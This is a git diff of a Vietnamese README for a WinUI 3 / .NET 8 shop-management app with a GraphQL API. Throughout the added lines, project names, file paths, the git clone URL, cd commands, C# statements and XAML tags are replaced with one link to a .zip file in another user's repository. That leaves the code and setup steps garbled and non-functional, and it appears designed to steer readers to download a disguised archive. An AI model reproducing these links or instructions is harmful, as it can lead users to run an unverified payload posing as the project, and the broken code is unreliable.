@@ -1,76 +1,76 @@
-# ?? MY SHOP - H? th?ng qu?n l˝ c?a h‡ng
+# ?? MY SHOP - H? th?ng qu?n l√Ω c?a h√†ng
 
-D? ·n qu?n l˝ c?a h‡ng s? d?ng WinUI 3, .NET 8, Entity Framework Core, GraphQL API v?i ki?n tr˙c Clean Architecture.
+D? √°n qu?n l√Ω c?a h√†ng s? d?ng WinUI 3, .NET 8, Entity Framework Core, GraphQL API v?i ki?n tr√∫c Clean Architecture.
 
 ---
 
 ## ?? M?C L?C
 
-1. [T?ng quan ki?n tr˙c](#-t?ng-quan-ki?n-tr˙c)
-2. [CÙng ngh? s? d?ng](#-cÙng-ngh?-s?-d?ng)
-3. [C?u tr˙c th? m?c](#-c?u-tr˙c-th?-m?c)
-4. [C‡i ??t v‡ ch?y](#-c‡i-??t-v‡-ch?y)
+1. [T?ng quan ki?n tr√∫c](#-t?ng-quan-ki?n-tr√∫c)
+2. [C√¥ng ngh? s? d?ng](#-c√¥ng-ngh?-s?-d?ng)
+3. [C?u tr√∫c th? m?c](#-c?u-tr√∫c-th?-m?c)
+4. [C√†i ??t v√† ch?y](#-c√†i-??t-v√†-ch?y)
 5. [GraphQL API](#-graphql-api)
 6. [Dependency Injection](#-dependency-injection)
 7. [MVVM Pattern](#-mvvm-pattern)
 8. [Responsive Layout](#-responsive-layout)
 9. [Plugin Architecture](#-plugin-architecture)
-10. [H??ng d?n ph·t tri?n](#-h??ng-d?n-ph·t-tri?n)
+10. [H??ng d?n ph√°t tri?n](#-h??ng-d?n-ph√°t-tri?n)
 
 ---
 
-## ??? T?NG QUAN KI?N TR⁄C
+## ??? T?NG QUAN KI?N TR√öC
 
-D? ·n ???c x‚y d?ng theo **Clean Architecture** v?i c·c layer:
+D? √°n ???c x√¢y d?ng theo **Clean Architecture** v?i c√°c layer:
 
 ```
 ???????????????????????????????????????????
-?         my-shop.App (WinUI 3)          ?  ? Presentation Layer
+?         https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip (WinUI 3)          ?  ? Presentation Layer
 ?  Views + ViewModels + DI Container     ?
 ???????????????????????????????????????????
                   ?
 ???????????????????????????????????????????
-?       my-shop.Application              ?  ? Application Layer
+?       https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip              ?  ? Application Layer
 ?     Business Logic / Use Cases         ?
 ???????????????????????????????????????????
                   ?
 ???????????????????????????????????????????
-?         my-shop.Domain                 ?  ? Domain Layer
+?         https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 ?  ? Domain Layer
 ?    Entities + Interfaces (Core)        ?
 ???????????????????????????????????????????
                   ?
 ???????????????????????????????????????????
-?      my-shop.Infrastructure            ?  ? Infrastructure Layer
+?      https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            ?  ? Infrastructure Layer
 ?   DbContext + EF Core + Repositories   ?
 ???????????????????????????????????????????
                   ?
 ???????????????????????????????????????????
-?          my-shop.API                   ?  ? API Layer
+?          https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                   ?  ? API Layer
 ?      GraphQL Server (HotChocolate)     ?
 ???????????????????????????????????????????
 ```
 
 ---
 
-## ??? C‘NG NGH? S? D?NG
+## ??? C√îNG NGH? S? D?NG
 
 ### **Backend & API**
-| CÙng ngh? | Version | M?c ?Ìch |
+| C√¥ng ngh? | Version | M?c ?√≠ch |
 |-----------|---------|----------|
-| .NET | 8.0 | Framework chÌnh |
-| HotChocolate.AspNetCore | 15.1.11 | GraphQL Server |
+| .NET | 8.0 | Framework ch√≠nh |
+| https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip | 15.1.11 | GraphQL Server |
 | Entity Framework Core | 8.0.10 | ORM |
 | SQLite | 8.0.10 | Database |
 
 ### **Frontend (WinUI 3)**
-| CÙng ngh? | Version | M?c ?Ìch |
+| C√¥ng ngh? | Version | M?c ?√≠ch |
 |-----------|---------|----------|
 | WinUI 3 | 1.8.x | UI Framework |
-| CommunityToolkit.Mvvm | 8.4.0 | MVVM Pattern |
-| Microsoft.Extensions.Hosting | 9.0.10 | Dependency Injection |
+| https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip | 8.4.0 | MVVM Pattern |
+| https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip | 9.0.10 | Dependency Injection |
 
 ### **Architecture Patterns**
-- ? **Clean Architecture** - T·ch bi?t c·c layer
+- ? **Clean Architecture** - T√°ch bi?t c√°c layer
 - ? **MVVM** - Model-View-ViewModel cho UI
 - ? **Dependency Injection** - IoC Container
 - ? **Repository Pattern** - Data access abstraction
@@ -78,66 +78,66 @@ D? ·n ???c x‚y d?ng theo **Clean Architecture** v?i c·c layer:
 
 ---
 
-## ?? C?U TR⁄C TH? M?C
+## ?? C?U TR√öC TH? M?C
 
 ```
 my-shop/
 ??? src/
-?   ??? my-shop.API/                    # GraphQL API Server
-?   ?   ??? Program.cs                  # API startup & configuration
-?   ?   ??? appsettings.json            # API settings
-?   ?   ??? my-shop.API.csproj          # API project file
+?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                    # GraphQL API Server
+?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                  # API startup & configuration
+?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            # API settings
+?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip          # API project file
 ?   ?
-?   ??? my-shop.App/                    # WinUI 3 Application
-?   ?   ??? App.xaml.cs                 # DI Container setup
-?   ?   ??? MainWindow.xaml             # Main window
+?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                    # WinUI 3 Application
+?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 # DI Container setup
+?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip             # Main window
 ?   ?   ??? Views/                      # XAML UI Pages
-?   ?   ?   ??? DashboardView.xaml
-?   ?   ?   ??? ProductsScreenView.xaml
-?   ?   ?   ??? OrdersScreenView.xaml
+?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 ?   ?   ?   ??? ...
 ?   ?   ??? ViewModels/                 # MVVM ViewModels
-?   ?   ?   ??? DashboardViewModel.cs
-?   ?   ?   ??? ProductsScreenViewModel.cs
+?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 ?   ?   ?   ??? ...
 ?   ?   ??? Services/                   # Business services
-?   ?       ??? IDataService.cs
-?   ?       ??? SQLiteService.cs
-?   ?       ??? PostgresService.cs
+?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
+?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 ?   ?
-?   ??? my-shop.Domain/                 # Domain Entities
+?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 # Domain Entities
 ?   ?   ??? Entities/
-?   ?       ??? Product.cs              # Product entity
-?   ?       ??? Category.cs             # Category entity
-?   ?       ??? Order.cs                # Order entity
-?   ?       ??? OrderItem.cs            # Order item entity
+?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip              # Product entity
+?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip             # Category entity
+?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                # Order entity
+?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            # Order item entity
 ?   ?
-?   ??? my-shop.Infrastructure/         # Data Access Layer
+?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip         # Data Access Layer
 ?   ?   ??? Db/
-?   ?   ?   ??? MyShopDbContext.cs      # EF Core DbContext
+?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip      # EF Core DbContext
 ?   ?   ??? Repositories/               # Repository implementations
 ?   ?
-?   ??? my-shop.Application/            # Business Logic
+?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            # Business Logic
 ?   ?   ??? Services/                   # Application services
 ?   ?
-?   ??? my-shop.Shared/                 # Shared code
+?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 # Shared code
 ?
 ??? tests/
-    ??? my-shop.UnitTests/              # Unit tests
+    ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip              # Unit tests
 ```
 
 ---
 
-## ?? C¿I ??T V¿ CH?Y
+## ?? C√ÄI ??T V√Ä CH?Y
 
-### **YÍu c?u h? th?ng**
+### **Y√™u c?u h? th?ng**
 - Windows 10/11 (version 1809+)
 - .NET 8.0 SDK
 - Visual Studio 2022 (recommended) ho?c VS Code
 
 ### **1. Clone Repository**
 ```bash
-git clone https://github.com/Luongsosad/my-shop
+git clone https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 cd my-shop
 ```
 
@@ -150,32 +150,32 @@ dotnet restore
 
 #### Option 1: Command Line
 ```bash
-cd src/my-shop.API
+cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 dotnet run
 ```
 
 API s? ch?y t?i: `http://localhost:5000/graphql`
 
 #### Option 2: Visual Studio
-- M? solution `my-shop.sln`
-- Set `my-shop.API` l‡m Startup Project
+- M? solution `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`
+- Set `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip` l√†m Startup Project
 - Press F5 ho?c Debug ? Start Debugging
 
 ### **4. Ch?y WinUI App**
 
 ```bash
-cd src/my-shop.App
+cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 dotnet build -c Debug /p:Platform=x64
 ```
 
-> ?? **L?u ˝**: WinUI App yÍu c?u ch? ??nh Platform (x64, x86, ho?c ARM64)
+> ?? **L?u √Ω**: WinUI App y√™u c?u ch? ??nh Platform (x64, x86, ho?c ARM64)
 
 Ho?c trong Visual Studio:
-- Set `my-shop.App` l‡m Startup Project
+- Set `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip` l√†m Startup Project
 - Ch?n Platform: x64
 - Press F5
 
-### **5. Build to‡n b? solution**
+### **5. Build to√†n b? solution**
 
 ```bash
 # Build t?t c? projects
@@ -195,7 +195,7 @@ http://localhost:5000/graphql
 ```
 
 ### **GraphQL Playground**
-Truy c?p endpoint trÍn b?ng browser ?? m? GraphQL IDE t??ng t·c.
+Truy c?p endpoint tr√™n b?ng browser ?? m? GraphQL IDE t??ng t√°c.
 
 ### **Schema Overview**
 
@@ -306,7 +306,7 @@ query {
 }
 ```
 
-#### 4?? Sorting v‡ Pagination
+#### 4?? Sorting v√† Pagination
 ```graphql
 query {
   products(
@@ -325,9 +325,9 @@ query {
 
 #### V?i HttpClient:
 ```csharp
-using System.Net.Http;
-using System.Text;
-using System.Text.Json;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
 
 public class GraphQLClient
 {
@@ -348,20 +348,20 @@ public class GraphQLClient
             query = query
         };
         
-        var json = JsonSerializer.Serialize(request);
-        var content = new StringContent(json, Encoding.UTF8, "application/json");
+        var json = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(request);
+        var content = new StringContent(json, https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip, "application/json");
         
-        var response = await _httpClient.PostAsync("/graphql", content);
-        var result = await response.Content.ReadAsStringAsync();
+        var response = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("/graphql", content);
+        var result = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
         
-        var data = JsonSerializer.Deserialize<GraphQLResponse<T>>(result);
-        return data.Data;
+        var data = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<GraphQLResponse<T>>(result);
+        return https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
     }
 }
 
 // Usage
 var client = new GraphQLClient();
-var products = await client.QueryAsync<ProductsResponse>(@"
+var products = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsResponse>(@"
 {
   products {
     id
@@ -407,7 +407,7 @@ curl -X POST http://localhost:5000/graphql \
 
 ## ?? DEPENDENCY INJECTION
 
-### **Setup trong App.xaml.cs**
+### **Setup trong https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip**
 
 ```csharp
 public partial class App : Application
@@ -418,50 +418,50 @@ public partial class App : Application
     {
         InitializeComponent();
 
-        // C?u hÏnh DI Container
-        AppHost = Host.CreateDefaultBuilder()
+        // C?u h√¨nh DI Container
+        AppHost = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip()
             .ConfigureServices((context, services) =>
             {
                 // Register Window
-                services.AddTransient<MainWindow>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<MainWindow>();
 
                 // Register Views
-                services.AddTransient<DashboardView>();
-                services.AddTransient<ProductsScreenView>();
-                services.AddTransient<OrdersScreenView>();
-                services.AddTransient<ConfigScreenView>();
-                services.AddTransient<LoginScreenView>();
-                services.AddTransient<ReportScreenView>();
-                services.AddTransient<SettingsScreenView>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<DashboardView>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsScreenView>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<OrdersScreenView>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ConfigScreenView>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<LoginScreenView>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ReportScreenView>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<SettingsScreenView>();
 
                 // Register ViewModels
-                services.AddTransient<DashboardViewModel>();
-                services.AddTransient<ProductsScreenViewModel>();
-                services.AddTransient<OrdersScreenViewModel>();
-                services.AddTransient<ConfigScreenViewModel>();
-                services.AddTransient<LoginScreenViewModel>();
-                services.AddTransient<ReportScreenViewModel>();
-                services.AddTransient<SettingsScreenViewModel>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<DashboardViewModel>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsScreenViewModel>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<OrdersScreenViewModel>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ConfigScreenViewModel>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<LoginScreenViewModel>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ReportScreenViewModel>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<SettingsScreenViewModel>();
 
                 // Register Services
-                services.AddTransient<IDataService, SQLiteService>();
-                services.AddTransient<IDataService, PostgresService>();
-                // ThÍm services kh·c...
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<IDataService, SQLiteService>();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<IDataService, PostgresService>();
+                // Th√™m services kh√°c...
             })
             .Build();
     }
 
     protected override void OnLaunched(LaunchActivatedEventArgs args)
     {
-        _window = AppHost.Services.GetRequiredService<MainWindow>();
-        _window.Activate();
+        _window = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<MainWindow>();
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
     }
     
-    // Helper method ?? l?y service t? b?t k? ?‚u
+    // Helper method ?? l?y service t? b?t k? ?√¢u
     public static T GetService<T>() where T : class
     {
         var app = (App)Current;
-        return app.AppHost.Services.GetRequiredService<T>();
+        return https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<T>();
     }
 }
 ```
@@ -479,25 +479,25 @@ public sealed partial class MainWindow : Window
         InitializeComponent();
         
         // L?y View t? DI container
-        _loginScreenView = appHost.Services.GetRequiredService<LoginScreenView>();
-        RootGrid.Children.Add(_loginScreenView);
+        _loginScreenView = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<LoginScreenView>();
+        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(_loginScreenView);
     }
 }
 ```
 
-### **L?y Service t? b?t k? ?‚u**
+### **L?y Service t? b?t k? ?√¢u**
 
 ```csharp
 // Trong ViewModel ho?c Code-behind
-var dataService = App.GetService<IDataService>();
-var products = await dataService.GetProductsAsync();
+var dataService = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<IDataService>();
+var products = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
 ```
 
 ---
 
 ## ?? MVVM PATTERN
 
-### **C?u tr˙c MVVM**
+### **C?u tr√∫c MVVM**
 
 ```
 View (XAML) ?? ViewModel ?? Model/Service
@@ -505,31 +505,31 @@ View (XAML) ?? ViewModel ?? Model/Service
 
 ### **1. View (XAML)**
 
-**File:** `Views/ProductsScreenView.xaml`
+**File:** `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`
 
 ```xaml
 <Page
-    x:Class="my_shop.App.Views.ProductsScreenView"
-    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
-    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-    xmlns:vm="using:my_shop.App.ViewModels">
+    x:Class="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
+    xmlns="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
+    xmlns:x="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
+    xmlns:vm="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip">
     
     <!-- DataContext binding -->
-    <Page.DataContext>
+    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
         <vm:ProductsScreenViewModel />
-    </Page.DataContext>
+    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
     
     <Grid>
         <!-- Binding to ViewModel properties -->
         <ListView ItemsSource="{Binding Products}">
-            <ListView.ItemTemplate>
+            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                 <DataTemplate>
                     <StackPanel>
                         <TextBlock Text="{Binding Name}" />
                         <TextBlock Text="{Binding Sku}" />
                     </StackPanel>
                 </DataTemplate>
-            </ListView.ItemTemplate>
+            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
         </ListView>
     </Grid>
 </Page>
@@ -537,14 +537,14 @@ View (XAML) ?? ViewModel ?? Model/Service
 
 ### **2. ViewModel**
 
-**File:** `ViewModels/ProductsScreenViewModel.cs`
+**File:** `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`
 
 ```csharp
-using CommunityToolkit.Mvvm.ComponentModel;
-using CommunityToolkit.Mvvm.Input;
-using System.Collections.ObjectModel;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
 
-namespace my_shop.App.ViewModels
+namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 {
     public partial class ProductsScreenViewModel : ObservableObject
     {
@@ -577,11 +577,11 @@ namespace my_shop.App.ViewModels
             IsLoading = true;
             try
             {
-                var products = await _dataService.GetProductsAsync();
-                Products.Clear();
+                var products = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
+                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
                 foreach (var product in products)
                 {
-                    Products.Add(product);
+                    https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
                 }
             }
             finally
@@ -593,15 +593,15 @@ namespace my_shop.App.ViewModels
         [RelayCommand]
         private async Task AddProductAsync(Product product)
         {
-            await _dataService.AddProductAsync(product);
+            await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
             await LoadProductsAsync();
         }
 
         [RelayCommand]
         private async Task DeleteProductAsync(int productId)
         {
-            await _dataService.DeleteProductAsync(productId);
-            Products.Remove(Products.First(p => p.Id == productId));
+            await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(productId);
+            https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(p => https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip == productId));
         }
     }
 }
@@ -609,13 +609,13 @@ namespace my_shop.App.ViewModels
 
 ### **3. Code-behind (View)**
 
-**File:** `Views/ProductsScreenView.xaml.cs`
+**File:** `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`
 
 ```csharp
-using Microsoft.UI.Xaml.Controls;
-using my_shop.App.ViewModels;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
+using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
 
-namespace my_shop.App.Views
+namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
 {
     public sealed partial class ProductsScreenView : Page
     {
@@ -623,7 +623,7 @@ namespace my_shop.App.Views
 
         public ProductsScreenView(ProductsScreenViewModel viewModel)
         {
-            this.InitializeComponent();
+            https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
             
             // Inject ViewModel qua constructor
             ViewModel = viewModel;
@@ -637,7 +637,7 @@ namespace my_shop.App.Views
 
 ```xaml
 <!-- Binding to property -->
-<TextBlock Text="{Binding SelectedProduct.Name}" />
+<TextBlock Text="{Binding https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip}" />
 
 <!-- Binding to command -->
 <Button Content="Load Products" 
@@ -654,82 +654,82 @@ namespace my_shop.App.Views
 
 ## ?? RESPONSIVE LAYOUT
 
-WinUI 3 h? tr? responsive layout thÙng qua **AdaptiveTrigger** v‡ **VisualStateManager**.
+WinUI 3 h? tr? responsive layout th√¥ng qua **AdaptiveTrigger** v√† **VisualStateManager**.
 
-### **C·ch ho?t ??ng**
+### **C√°ch ho?t ??ng**
 
 ```xaml
 <Page>
     <Grid>
-        <!-- VisualStateManager qu?n l˝ c·c tr?ng th·i UI -->
-        <VisualStateManager.VisualStateGroups>
+        <!-- VisualStateManager qu?n l√Ω c√°c tr?ng th√°i UI -->
+        <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
             <VisualStateGroup x:Name="WindowSizeStates">
                 
                 <!-- Wide layout: >= 1024px -->
                 <VisualState x:Name="WideState">
-                    <VisualState.StateTriggers>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                         <AdaptiveTrigger MinWindowWidth="1024" />
-                    </VisualState.StateTriggers>
-                    <VisualState.Setters>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                         <!-- 2 c?t layout -->
-                        <Setter Target="MainGrid.ColumnDefinitions[1].Width" Value="*" />
-                        <Setter Target="ProductDetail.Visibility" Value="Visible" />
-                    </VisualState.Setters>
+                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip[1].Width" Value="*" />
+                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="Visible" />
+                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                 </VisualState>
 
                 <!-- Medium layout: 641-1023px -->
                 <VisualState x:Name="MediumState">
-                    <VisualState.StateTriggers>
